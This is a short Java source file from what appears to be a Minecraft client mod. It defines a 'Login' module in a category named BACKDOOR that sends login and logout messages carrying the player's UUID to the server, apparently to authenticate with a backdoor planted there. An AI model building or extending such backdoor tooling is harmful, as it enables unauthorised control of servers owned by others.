package lol.moruto.client.module.impl;

import lol.moruto.client.backdoor.PacketManager;
import lol.moruto.client.module.Category;
import lol.moruto.client.module.Module;

public class LoginModule extends Module {
    public LoginModule() {
        super("Login", "Login the backdoor", Category.BACKDOOR);
    }

    @Override
    public void onEnable() {
        PacketManager.sendToServer("login:" + mc.player.getUuidAsString());
    }

    @Override
    public void onDisable() {
        PacketManager.sendToServer("logout:" + mc.player.getUuidAsString());
    }
}
